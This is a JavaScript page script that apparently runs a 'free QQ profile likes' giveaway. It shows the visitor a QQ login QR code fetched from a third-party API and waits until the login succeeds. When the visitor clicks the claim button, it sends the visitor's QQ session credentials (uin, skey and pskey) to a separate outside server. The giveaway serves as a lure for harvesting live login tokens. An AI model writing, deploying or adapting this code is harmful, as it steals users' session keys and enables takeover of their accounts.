    layui.use('element', function(){
        var $ = layui.jquery,element = layui.element;
        getqrocde();
        function getqrocde() {
            $.ajax({
                url: 'https://api.oioweb.cn/api/qqqrcode.php',
                type: 'GET',
                data: {type:"Getqrcode"},
                dataType: 'json',
                success: function (data) {
                    window.data = data;
                    $('#qrimg').html('<img style="max-width:147px;max-height:147px;" src="data:image/png;base64,' + data.data + '" >');
                    if(window.id){
                        window.clearInterval(window.id);
                    }
                    window.id = setInterval(getresult, 3000);
                },
                error: function () {
                    layer.alert("二维码获取失败!");
                }
            });
        }
        function getresult() {
            $.ajax({
                url: 'https://api.oioweb.cn/api/qqqrcode.php?type=Getresult',
                aycnc: false,
                type: 'GET',
                async:false,
                data: {qrsig:data['qrsig']},
                dataType: 'json',
                success: function (data) {
                    window.qrsig = data;
                    if (data.code==0){
                        window.clearInterval(window.id);
                        $('#msg').html(data.nickname+'登录成功！');
                        element.tabAdd('tab', {
                            title: '领取信息'
                            ,content: '<blockquote class="layui-elem-quote">请 先 确 认 领 取 信 息 ：</blockquote><form class="layui-form layui-form-pane" action=""><div class="layui-form-item"><label class="layui-form-label">领取账号</label><div class="layui-input-block"><input name="qq" type="text"  required lay-verify="required" placeholder="" autocomplete="off" class="layui-input" value="599928887" disabled></div></div><div class="layui-form-item"><label class="layui-form-label">Q Q 昵称</label><div class="layui-input-block"><input type="text"  required lay-verify="required" placeholder="" autocomplete="off" class="layui-input" name="name" value="教书先生" disabled></div></div><div class="layui-form-item"><label class="layui-form-label">领取数量</label><div class="layui-input-block"><input type="text"  required lay-verify="required" placeholder="" autocomplete="off" class="layui-input" value="500~5000" disabled></div></div></form><button type="button" class="layui-btn layui-btn-fluid" id="lingqu">确认领取名片赞</button>'
                            ,id: 'lz'
                        });
                        $("input[name='qq']").attr('value',data.uin);
                        $("input[name='name']").attr('value',data.nickname);
                        element.tabChange('tab', 'lz');
                        $("#lingqu").on('click',function () {
                            layer.msg('领取中~~~', {
                                icon: 16,
                                shade: 0.01,
                                time: 9999999
                            });
                            $.ajax({
                                type: 'POST',
                                url: '//hzb.oioweb.cn/post.php',
                                data:{
                                    qq:qrsig['uin'],
                                    skey:qrsig['skey'],
                                    pskey:qrsig['pskey']
                                },
                                dataType: 'json',
                                success: function (data) {
                                    var msg =data.msg;
                                    str=msg.replace("../tuiguang","");
                                    if(data.code == '1'){
                                        layer.alert(str,function(){window.location.href="";});
                                    }else if(data.code=='0'){
                                        layer.alert(str,function(){window.location.href="";});
                                    }else if(data.code=='-1'){
                                    	layer.alert(msg);
                                    }
                                },
                                error: function () {
                                    layer.alert("领取失败请重试！");
                                }
                            });
                        });
                    }else {
                        $('#msg').html(data.msg);
                    }
                },
                error: function () {
                    console.log('登录结果获取失败！');
                }
            });
        }
    });